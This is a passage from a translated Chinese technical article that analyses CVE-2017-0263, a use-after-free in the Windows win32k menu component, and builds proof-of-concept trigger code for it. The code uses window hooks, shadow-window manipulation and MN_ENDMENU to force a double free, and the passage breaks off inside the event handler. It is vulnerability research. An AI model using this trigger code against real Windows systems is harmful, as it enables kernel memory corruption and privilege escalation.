# 从 CVE-2017-0263 漏洞分析到菜单管理组件（下）
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
**传送门：[从 CVE-2017-0263
漏洞分析到菜单管理组件（上）](https://www.anquanke.com/post/id/102377)**
CVE-2017-0263 是 Windows 操作系统 `win32k` 内核模块菜单管理组件中的一个
UAF（释放后重用）漏洞，据报道称该漏洞在之前与一个 EPS 漏洞被 APT28 组织组合攻击用来干涉法国大选。这篇文章将对用于这次攻击的样本的
CVE-2017-0263 漏洞部分进行一次简单的分析，以整理出该漏洞利用的运作原理和基本思路，并对 Windows
窗口管理器子系统的菜单管理组件进行简单的探究。分析的环境是 Windows 7 x86 SP1 基础环境的虚拟机。
## 0x3 触发
接下来通过构造验证代码使系统在调用 `xxxMNEndMenuState` 函数释放根弹出菜单对象之后并在重置当前线程信息对象的成员域
`pMenuState` 之前，使线程的执行流再次进入 `xxxMNEndMenuState` 函数调用，致使触发对目标成员域
`pGlobalPopupMenu` 指向对象的重复释放。
在用户进程中首先为验证代码创建单独的线程，利用代码的主体任务都在新线程的上下文中执行。在原有的主线程中监听全局变量 `bDoneExploit`
是否被赋值以等待下一步操作。
验证代码首先通过调用 `CreatePopupMenu` 等函数创建两个非模态的可弹出的菜单对象。由于模态的菜单将导致线程在内核中进入函数
`xxxMNLoop`
的循环等待状态，导致无法在同一线程中执行其他操作，对漏洞触发造成难度，因此我们选择非模态的菜单类型。这里的可弹出的菜单对象不是前面提到的
`tagPOPUPMENU` 类型的对象，而是带有 `MFISPOPUP` 标志位状态的 `tagMENU` 对象。结构体 `tagMENU`
是菜单对象的实体，而 `tagPOPUPMENU`
是用来描述菜单对象实体的弹出状态的对象，在菜单对象实际弹出时创建、菜单对象结束弹出状态时销毁，需要注意两者的区别。
接下来通过 `AppendMenuA` 为两个菜单添加菜单项，并使第二个成为第一个的子菜单。
    LPCSTR szMenuItem = "item";
    MENUINFO mi = { 0 };
    mi.cbSize  = sizeof(mi);
    mi.fMask   = MIM_STYLE;
    mi.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;
    hpopupMenu[0] = CreatePopupMenu();
    hpopupMenu[1] = CreatePopupMenu();
    SetMenuInfo(hpopupMenu[0], &mi);
    SetMenuInfo(hpopupMenu[1], &mi);
    AppendMenuA(hpopupMenu[0], MF_BYPOSITION | MF_POPUP, (UINT_PTR)hpopupMenu[1], szMenuItem);
    AppendMenuA(hpopupMenu[1], MF_BYPOSITION | MF_POPUP, 0, szMenuItem);
_创建并关联两个菜单对象的验证代码_
接下来创建一个普通的窗口对象 `hWindowMain` 以在后续菜单弹出时作为弹出菜单的拥有者窗口对象。如果编译时选择 GUI
界面程序，则获取默认的窗口对象句柄即可，这一步就不需要创建额外的窗口对象了。
    WNDCLASSEXW wndClass = { 0 };
    wndClass = { 0 };
    wndClass.cbSize = sizeof(WNDCLASSEXW);
    wndClass.lpfnWndProc    = DefWindowProcW;
    wndClass.cbWndExtra     = 0;
    wndClass.hInstance      = GetModuleHandleA(NULL);
    wndClass.lpszMenuName   = NULL;
    wndClass.lpszClassName  = L"WNDCLASSMAIN";
    RegisterClassExW(&wndClass);
    hWindowMain = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
        L"WNDCLASSMAIN",
        NULL,
        WS_VISIBLE,
        0,
        0,
        1,
        1,
        NULL,
        NULL,
        GetModuleHandleA(NULL),
        NULL);
_创建用来拥有弹出菜单的主窗口对象的验证代码_
通过函数 `SetWindowsHookExW` 创建类型为 `WH_CALLWNDPROC` 关联当前线程的挂钩程序，并通过
`SetWinEventHook` 创建范围包含 `EVENT_SYSTEM_MENUPOPUPSTART`
的关联当前进程和线程的事件通知消息处理程序。前面已经提到，设置 `WH_CALLWNDPROC`
类型的挂钩程序会在每次线程将消息发送给窗口对象之前调用。事件通知 `EVENT_SYSTEM_MENUPOPUPSTART`
表示目标弹出菜单已被显示在屏幕上。
    SetWindowsHookExW(WH_CALLWNDPROC, xxWindowHookProc,
        GetModuleHandleA(NULL),
        GetCurrentThreadId());
    SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,
        GetModuleHandleA(NULL),
        xxWindowEventProc,
        GetCurrentProcessId(),
        GetCurrentThreadId(),
        0);
_创建消息挂钩和时间通知程序的验证代码_
验证代码调用函数 `TrackPopupMenuEx` 使第一个菜单作为根菜单在创建的窗口中弹出。
    TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL);
_调用函数 TrackPopupMenuEx 的验证代码_
接着通过调用 `GetMessage` 和 `DispatchMessage` 等函数在当前线程中实现消息循环。
    MSG msg = { 0 };
    while (GetMessageW(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
_实现消息循环的验证代码_
在函数 `TrackPopupMenuEx` 执行期间，系统调用函数 `xxxCreateWindowEx`
创建新的菜单类型的窗口对象。就像前面的章节提到的那样，创建窗口对象成功时，函数向该窗口对象发送 `WM_NCCREATE` 消息。在函数
`xxxSendMessageTimeout` 调用对象指定的消息处理程序之前，还会调用 `xxxCallHook` 函数用来调用先前由用户进程设定的
`WH_CALLWNDPROC` 类型的挂钩处理程序。这时执行流会回到我们先前在验证代码中定义的挂钩处理函数中。
在自定义挂钩处理函数 `xxWindowHookProc` 中，我们根据参数`lParam`指向`tagCWPSTRUCT`对象的成员域`message`
判断当前处理的消息是否为 `WM_NCCREATE` 消息，不是的情况则直接忽略。接下来根据窗口句柄获取窗口对象的类名称，当类名称为 `#32768`
时，表示这是创建的菜单窗口对象，因此将该句柄记录下来以备后续引用。
    LRESULT CALLBACK
    xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
    {
        tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;
        static HWND hwndMenuHit = 0;
        if (cwp->message != WM_NCCREATE)
        {
            return CallNextHookEx(0, code, wParam, lParam);
        }
        WCHAR szTemp[0x20] = { 0 };
        GetClassNameW(cwp->hwnd, szTemp, 0x14);
        if (!wcscmp(szTemp, L"#32768"))
        {
            hwndMenuHit = cwp->hwnd;
        }
        return CallNextHookEx(0, code, wParam, lParam);
    }
_在挂钩处理程序中记录 #32768 窗口的句柄_
在目标菜单窗口对象创建完成时，系统在内核中设置窗口对象的位置坐标并使其显示在屏幕上。在这期间，系统为该窗口对象创建关联的类型为 `SysShadow`
的阴影窗口对象。同样地，创建阴影窗口对象并发送 `WM_NCCREATE` 消息时，系统也会调用 `xxxCallHook` 函数来分发调用挂钩程序。
前面章节的“终止菜单”部分的分析已知，在函数 `xxxEndMenuLoop` 调用期间，系统对每个弹出菜单窗口对象都调用了两次
`xxxRemoveShadow` 函数。这将导致在到达漏洞触发位置之前阴影窗口被提前取消关联和销毁。
**因此我们要想办法为成员域`uButtonDownHitArea` 存储的目标菜单窗口对象创建并关联至少 3 个阴影窗口对象。**
回到验证代码的自定义挂钩处理函数中，在判断窗口类名称的位置增加判断是否为 `SysShadow` 的情况。如果命中这种情况，我们通过调用函数
`SetWindowPos` 对先前保存句柄指向的类名称为 `#32768` 的窗口对象依次设置 `SWP_HIDEWINDOW` 和
`SWP_SHOWWINDOW` 状态标志，使窗口先隐藏后显示，再次触发内核中添加阴影窗口关联的逻辑以创建新的阴影窗口对象。
在执行流进入自定义挂钩处理函数的 `SysShadow` 处理逻辑时，在内核中正处于创建阴影窗口的 `xxxCreateWindowEx`
执行期间，此时创建的阴影窗口对象和原菜单窗口对象还没有关联起来，它们的关联关系尚未被插入 `gpShadowFirst` 链表中。此时对目标菜单对象调用
`SetWindowPos` 以设置 `SWP_SHOWWINDOW`
状态标志，将导致系统对目标菜单窗口创建并关联多个阴影窗口对象，后创建的阴影窗口对象将被先插入 `gpShadowFirst`
链表中，从而位于链表中更靠后的位置。
多阴影窗口关联的插入链表和位置顺序逻辑
在自定义挂钩处理函数的 `SysShadow` 处理逻辑中，对进入次数进行计数，对前 2 次进入的情况调用函数 `SetWindowPos`
以触发创建新的阴影窗口关联的逻辑；到第 3 次进入的情况时，我们通过调用函数 `SetWindowLong`
将目标阴影窗口对象的消息处理函数篡改为自定义的阴影窗口消息处理函数。
    if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL)
    {
        if (++iShadowCount == 3)
        {
            SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxShadowWindowProc);
        }
        else
        {
            SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_HIDEWINDOW);
            SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_SHOWWINDOW);
        }
    }
_对目标菜单窗口对象创建多阴影窗口关联的验证代码_
一切处理妥当后，需设置相关的全局标志以阻止执行流重复进入该自定义挂钩处理函数致使上面的逻辑代码被多次执行。
在内核函数 `xxxTrackPopupMenuEx` 中处理完成对根弹出菜单窗口对象的创建时，调用 `xxxWindowEvent`
函数以发送代表“菜单弹出开始”的 `EVENT_SYSTEM_MENUPOPUPSTART` 事件通知。这将进入我们先前设置的自定义事件通知处理函数
`xxWindowEventProc` 中。每当进入该事件通知处理程序时，代表当前新的弹出菜单已显示在屏幕中。
在验证代码的自定义事件通知处理函数 `xxWindowEventProc` 中进行计数，当第 1
次进入函数时，表示根弹出菜单已在屏幕中显示，因此通过调用函数 `SendMessage` 向参数句柄 `hwnd` 指向的菜单窗口对象发送
`WM_LBUTTONDOWN` 鼠标左键按下的消息，并在参数 `lParam` 传入按下的相对坐标。在 32 位系统中，参数 `lParam` 是一个
`DWORD` 类型的数值，其高低 16 位分别代表横坐标和纵坐标的相对位置，传入的数值需要确保相对坐标位于先前创建菜单时设定的子菜单项的位置。参数
`wParam` 用户设定按下的是左键还是右键，设置为 `1` 表示 `MK_LBUTTON` 左键。
在内核中消息处理函数 `xxxMenuWindowProc` 接收并处理该消息，这将导致最终调用到函数 `xxxMNOpenHierarchy`
以创建新弹出的子菜单的相关对象。类似地，在处理完成新的子菜单在屏幕中的显示时，函数 `xxxMNOpenHierarchy` 调用函数
`xxxWindowEvent` 发送 `EVENT_SYSTEM_MENUPOPUPSTART` 事件通知。这使得执行流再次进入自定义事件通知处理函数
`xxWindowEventProc` 中。
当第 2 次进入函数 `xxWindowEventProc` 时，表示弹出的子菜单已在屏幕中显示。此时验证代码调用函数 `SendMessage`
向目标菜单对象发送 `MN_ENDMENU` 菜单终止的消息，这将导致执行流最终进入内核函数 `xxxMNEndMenuState` 中。
    VOID CALLBACK
    xxWindowEventProc(
        HWINEVENTHOOK hWinEventHook,
        DWORD         event,
        HWND          hwnd,
        LONG          idObject,
        LONG          idChild,
        DWORD         idEventThread,
        DWORD         dwmsEventTime
    )
    {
        if (++iMenuCreated >= 2)
        {
            SendMessageW(hwnd, MN_ENDMENU, 0, 0);
        }
        else
        {
            SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002); // (2,2)